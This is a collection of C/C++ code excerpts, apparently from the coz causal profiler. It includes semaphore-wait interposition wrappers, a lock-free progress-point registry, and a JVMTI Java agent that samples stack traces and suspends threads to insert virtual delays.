int sem_wait(sem_t* sem) {
    if(initialized) profiler::get_instance().pre_block();
    int result = real::sem_wait(sem);
    // Woken by a sem_post from another thread, so skip the delays.
    if(initialized) profiler::get_instance().post_block(true);
    return result;
  }

int sem_timedwait(sem_t* sem, const struct timespec* abstime) {
    if(initialized) profiler::get_instance().pre_block();
    int result = real::sem_timedwait(sem, abstime);
    // On timeout nobody handed us the semaphore, so we own our delays.
    if(initialized) profiler::get_instance().post_block(result == 0);
    return result;
  }

kern_return_t coz_semaphore_wait(semaphore_t sema) {
  if (!coz_initialized()) return orig_semaphore_wait(sema);
  coz_pre_block();
  kern_return_t result = orig_semaphore_wait(sema);
  coz_post_block(true);
  return result;
}

kern_return_t coz_semaphore_timedwait(semaphore_t sema, mach_timespec_t wait_time) {
  if (!coz_initialized()) return orig_semaphore_timedwait(sema, wait_time);
  coz_pre_block();
  kern_return_t result = orig_semaphore_timedwait(sema, wait_time);
  // A timeout means nobody handed us the semaphore, so we own our delays.
  coz_post_block(result == KERN_SUCCESS);
  return result;
}

int coz_sem_wait(sem_t* sem) {
  if (!coz_initialized()) return orig_sem_wait(sem);
  coz_pre_block();
  int result = orig_sem_wait(sem);
  coz_post_block(true);
  return result;
}

static int resolve_sem_wait(sem_t* sem) throw() {
  GET_SYMBOL(sem_wait);
  if(real_sem_wait) return real_sem_wait(sem);
  else return -1;
}

static int resolve_sem_trywait(sem_t* sem) throw() {
  GET_SYMBOL(sem_trywait);
  if(real_sem_trywait) return real_sem_trywait(sem);
  else return -1;
}

static int resolve_sem_timedwait(sem_t* sem, const struct timespec* abstime) throw() {
  GET_SYMBOL(sem_timedwait);
  if(real_sem_timedwait) return real_sem_timedwait(sem, abstime);
  else return -1;
}

static int resolve_sem_post(sem_t* sem) throw() {
  GET_SYMBOL(sem_post);
  if(real_sem_post) return real_sem_post(sem);
  else return -1;
}

ProgressPoint* find_or_create(const char* name, CounterKind kind) {
  for (;;) {
    ProgressPoint* head = g_points.load(std::memory_order_acquire);
    for (ProgressPoint* p = head; p != nullptr; p = p->next) {
      if (p->kind == kind && p->name == name) return p;
    }

    auto* fresh = new ProgressPoint(name, kind);
    fresh->next = head;
    if (g_points.compare_exchange_weak(head, fresh, std::memory_order_release,
                                       std::memory_order_relaxed)) {
      return fresh;
    }
    // Someone else pushed first: drop ours and rescan, in case they added the
    // very point we wanted.
    delete fresh;
  }
}

int64_t now_ns() {
  return std::chrono::duration_cast<std::chrono::nanoseconds>(
             std::chrono::steady_clock::now().time_since_epoch())
      .count();
}

std::string source_path(const std::string& class_signature, const char* file) {
  std::string internal = class_signature;
  if (internal.size() > 2 && internal.front() == 'L' && internal.back() == ';') {
    internal = internal.substr(1, internal.size() - 2);
  }
  // Nested classes (Outer$Inner) share the outer class's source file.
  const size_t slash = internal.rfind('/');
  const std::string package = (slash == std::string::npos) ? "" : internal.substr(0, slash + 1);
  return package + (file != nullptr ? file : "Unknown");
}

bool in_scope(const std::string& class_signature) {
  const std::string internal =
      (class_signature.size() > 2 && class_signature.front() == 'L')
          ? class_signature.substr(1, class_signature.size() - 2)
          : class_signature;

  if (!g_options.scope.empty()) {
    return internal.compare(0, g_options.scope.size(), g_options.scope) == 0;
  }

  // No explicit scope: everything except the runtime and coz itself.
  static const char* const kExcluded[] = {"java/", "javax/", "jdk/",  "sun/",
                                          "com/sun/", "kotlin/", "scala/", "coz/"};
  for (const char* prefix : kExcluded) {
    if (internal.compare(0, strlen(prefix), prefix) == 0) return false;
  }
  return true;
}

const MethodInfo* method_info(jmethodID method) {
  auto it = g_methods.find(method);
  if (it != g_methods.end()) return &it->second;

  MethodInfo info;

  jclass declaring = nullptr;
  if (g_jvmti->GetMethodDeclaringClass(method, &declaring) != JVMTI_ERROR_NONE) {
    g_methods[method] = info;
    return &g_methods[method];
  }

  char* signature = nullptr;
  if (g_jvmti->GetClassSignature(declaring, &signature, nullptr) == JVMTI_ERROR_NONE &&
      signature != nullptr) {
    if (in_scope(signature)) {
      char* file = nullptr;
      // Classes compiled without -g:source have no source file name; such a
      // method can never be attributed to a line, so it stays out of scope.
      if (g_jvmti->GetSourceFileName(declaring, &file) == JVMTI_ERROR_NONE && file != nullptr) {
        jint count = 0;
        jvmtiLineNumberEntry* table = nullptr;
        // Likewise for -g:lines. Native and abstract methods return
        // JVMTI_ERROR_NATIVE_METHOD / ABSENT_INFORMATION here.
        if (g_jvmti->GetLineNumberTable(method, &count, &table) == JVMTI_ERROR_NONE) {
          info.in_scope = true;
          info.source = source_path(signature, file);
          info.lines.assign(table, table + count);
          deallocate(table);
        }
        deallocate(file);
      }
    }
    deallocate(signature);
  }

  g_methods[method] = std::move(info);
  return &g_methods[method];
}

std::string resolve_line(jmethodID method, jlocation location) {
  const MethodInfo* info = method_info(method);
  if (info == nullptr || !info->in_scope || info->lines.empty()) return "";

  // The line table maps a starting bytecode index to a line; the applicable
  // entry is the last one at or before this location.
  jint line = info->lines.front().line_number;
  for (const auto& entry : info->lines) {
    if (entry.start_location <= location) {
      line = entry.line_number;
    } else {
      break;
    }
  }
  return info->source + ":" + std::to_string(line);
}

std::vector<Sample> take_sample(jvmtiStackInfo** stack_info) {
  std::vector<Sample> samples;
  jint thread_count = 0;
  *stack_info = nullptr;

  const int64_t sample_start = now_ns();
  if (g_jvmti->GetAllStackTraces(1, stack_info, &thread_count) != JVMTI_ERROR_NONE) {
    return samples;
  }
  g_ticks++;
  g_sample_ns += now_ns() - sample_start;

  JNIEnv* jni = nullptr;
  g_vm->GetEnv(reinterpret_cast<void**>(&jni), JNI_VERSION_1_6);

  for (jint i = 0; i < thread_count; i++) {
    const jvmtiStackInfo& info = (*stack_info)[i];

    // Never sample or suspend ourselves.
    if (g_agent_thread != nullptr && jni != nullptr &&
        jni->IsSameObject(info.thread, g_agent_thread)) {
      continue;
    }
    if (info.frame_count < 1) continue;

    Sample sample;
    sample.thread = info.thread;
    sample.line = resolve_line(info.frame_buffer[0].method, info.frame_buffer[0].location);
    samples.push_back(std::move(sample));
  }

  return samples;
}

int64_t insert_delay(const std::vector<Sample>& samples, const std::string& selected,
                     int64_t delay_ns) {
  if (delay_ns <= 0) return 0;

  std::vector<jthread> victims;
  victims.reserve(samples.size());
  for (const Sample& sample : samples) {
    if (sample.line != selected) victims.push_back(sample.thread);
  }
  if (victims.empty()) return 0;

  std::vector<jvmtiError> results(victims.size());
  if (g_jvmti->SuspendThreadList(static_cast<jint>(victims.size()), victims.data(),
                                 results.data()) != JVMTI_ERROR_NONE) {
    return 0;
  }

  const int64_t slept_start = now_ns();
  sleep_ns(delay_ns);
  const int64_t slept = now_ns() - slept_start;

  // Resume only what actually suspended: a thread that died or was already
  // suspended must not be resumed here.
  std::vector<jthread> to_resume;
  to_resume.reserve(victims.size());
  for (size_t i = 0; i < victims.size(); i++) {
    if (results[i] == JVMTI_ERROR_NONE) to_resume.push_back(victims[i]);
  }
  if (!to_resume.empty()) {
    std::vector<jvmtiError> resume_results(to_resume.size());
    g_jvmti->ResumeThreadList(static_cast<jint>(to_resume.size()), to_resume.data(),
                              resume_results.data());
  }

  // The measured pause, not the requested one: sleep overshoots, and that
  // overshoot is real time the program stood still.
  return slept;
}

Snapshot snapshot_points() {
  Snapshot snap;
  for (ProgressPoint* p = g_points.load(std::memory_order_acquire); p != nullptr; p = p->next) {
    snap.counts.emplace_back(p, p->count.load(std::memory_order_relaxed));
  }
  return snap;
}

std::string select_line(const std::map<std::string, int64_t>& recent, std::mt19937_64& rng) {
  int64_t total = 0;
  for (const auto& entry : recent) total += entry.second;
  if (total == 0) return "";

  std::uniform_int_distribution<int64_t> pick(0, total - 1);
  int64_t target = pick(rng);
  for (const auto& entry : recent) {
    if (target < entry.second) return entry.first;
    target -= entry.second;
  }
  return recent.begin()->first;
}

void write_json_escaped(std::ostream& out, const std::string& value) {
  for (char c : value) {
    switch (c) {
      case '"': out << "\\\""; break;
      case '\\': out << "\\\\"; break;
      case '\n': out << "\\n"; break;
      case '\r': out << "\\r"; break;
      case '\t': out << "\\t"; break;
      default: out << c; break;
    }
  }
}

void bump(JNIEnv* jni, jstring name, CounterKind kind) {
  if (name == nullptr) return;
  const char* chars = jni->GetStringUTFChars(name, nullptr);
  if (chars == nullptr) return;
  find_or_create(chars, kind)->count.fetch_add(1, std::memory_order_relaxed);
  jni->ReleaseStringUTFChars(name, chars);
}

void parse_options(const char* options) {
  if (options == nullptr) return;

  std::string rest(options);
  while (!rest.empty()) {
    const size_t comma = rest.find(',');
    std::string item = rest.substr(0, comma);
    rest = (comma == std::string::npos) ? "" : rest.substr(comma + 1);

    const size_t eq = item.find('=');
    if (eq == std::string::npos) continue;
    const std::string key = item.substr(0, eq);
    const std::string value = item.substr(eq + 1);

    if (key == "output") {
      g_options.output = value;
    } else if (key == "scope") {
      g_options.scope = value;
      // Accept dotted package names; JVMTI signatures are slash-separated.
      for (char& c : g_options.scope) {
        if (c == '.') c = '/';
      }
    } else if (key == "period") {
      g_options.sample_period = std::strtoll(value.c_str(), nullptr, 10);
    } else if (key == "verbose") {
      g_options.verbose = (value != "0");
    }
  }
}

jthread alloc_agent_thread(JNIEnv* jni) {
  jclass thread_class = jni->FindClass("java/lang/Thread");
  jmethodID ctor = jni->GetMethodID(thread_class, "<init>", "(Ljava/lang/String;)V");
  jstring name = jni->NewStringUTF("coz-profiler");
  jthread thread = static_cast<jthread>(jni->NewObject(thread_class, ctor, name));
  return static_cast<jthread>(jni->NewGlobalRef(thread));
}

void JNICALL on_vm_init(jvmtiEnv* jvmti, JNIEnv* jni, jthread) {
  jclass coz = jni->FindClass("coz/Coz");
  if (coz == nullptr) {
    // The application never loaded coz.Coz. Sampling would still work, but
    // with no progress point there is nothing to correlate a speedup against.
    jni->ExceptionClear();
    fprintf(stderr,
            "[coz-java] coz.Coz not found on the classpath; no progress points, "
            "no profile will be written\n");
    return;
  }

  static const JNINativeMethod natives[] = {
      {const_cast<char*>("available0"), const_cast<char*>("()Z"),
       reinterpret_cast<void*>(Coz_available)},
      {const_cast<char*>("progress0"), const_cast<char*>("(Ljava/lang/String;)V"),
       reinterpret_cast<void*>(Coz_progress)},
      {const_cast<char*>("begin0"), const_cast<char*>("(Ljava/lang/String;)V"),
       reinterpret_cast<void*>(Coz_begin)},
      {const_cast<char*>("end0"), const_cast<char*>("(Ljava/lang/String;)V"),
       reinterpret_cast<void*>(Coz_end)},
  };

  if (jni->RegisterNatives(coz, natives, 4) != 0) {
    fprintf(stderr, "[coz-java] failed to register natives on coz.Coz\n");
    return;
  }

  g_agent_thread = alloc_agent_thread(jni);
  g_running.store(true, std::memory_order_relaxed);
  jvmti->RunAgentThread(g_agent_thread, &sampler_entry, nullptr, JVMTI_THREAD_NORM_PRIORITY);

  if (g_options.verbose) {
    fprintf(stderr, "[coz-java] agent started (output=%s, scope=%s, period=%lldns)\n",
            g_options.output.c_str(), g_options.scope.empty() ? "<application>" : g_options.scope.c_str(),
            static_cast<long long>(g_options.sample_period));
  }
}

void JNICALL on_vm_death(jvmtiEnv*, JNIEnv*) {
  // Let the profiler loop notice, finish its current experiment, and flush.
  g_running.store(false, std::memory_order_relaxed);
  // The agent thread sleeps at most one sample period between checks, plus the
  // time to write its summary records.
  sleep_ns(g_options.sample_period * 4);
}

JNIEXPORT jint JNICALL Agent_OnLoad(JavaVM* vm, char* options, void*) {
  g_vm = vm;
  parse_options(options);

  if (vm->GetEnv(reinterpret_cast<void**>(&g_jvmti), JVMTI_VERSION_1_2) != JNI_OK) {
    fprintf(stderr, "[coz-java] this JVM does not support JVMTI 1.2\n");
    return JNI_ERR;
  }

  jvmtiCapabilities caps;
  memset(&caps, 0, sizeof(caps));
  caps.can_suspend = 1;                 // insert virtual delays
  caps.can_get_line_numbers = 1;        // map bytecode index to source line
  caps.can_get_source_file_name = 1;    // name the source file
  if (g_jvmti->AddCapabilities(&caps) != JVMTI_ERROR_NONE) {
    fprintf(stderr, "[coz-java] JVM denied the capabilities coz needs\n");
    return JNI_ERR;
  }

  jvmtiEventCallbacks callbacks;
  memset(&callbacks, 0, sizeof(callbacks));
  callbacks.VMInit = &on_vm_init;
  callbacks.VMDeath = &on_vm_death;
  if (g_jvmti->SetEventCallbacks(&callbacks, sizeof(callbacks)) != JVMTI_ERROR_NONE) {
    return JNI_ERR;
  }

  g_jvmti->SetEventNotificationMode(JVMTI_ENABLE, JVMTI_EVENT_VM_INIT, nullptr);
  g_jvmti->SetEventNotificationMode(JVMTI_ENABLE, JVMTI_EVENT_VM_DEATH, nullptr);
  return JNI_OK;
}

void coz_shim_init(void) {
  /* libcoz is injected by `coz run` via LD_PRELOAD / DYLD_INSERT_LIBRARIES, so
   * its symbols are in the global scope and RTLD_DEFAULT finds them. When the
   * program runs without the profiler these stay NULL and every entry point
   * below degrades to a no-op. */
  s_get_counter = (coz_get_counter_t)dlsym(RTLD_DEFAULT, "_coz_get_counter");
  s_add_delays = (coz_add_delays_t)dlsym(RTLD_DEFAULT, "_coz_add_delays");
}

HomeGuard(const char* new_home) {
    const char* h = std::getenv("HOME");
    had_home = (h != nullptr);
    if(had_home) saved = h;
    setenv("HOME", new_home, 1);
  }

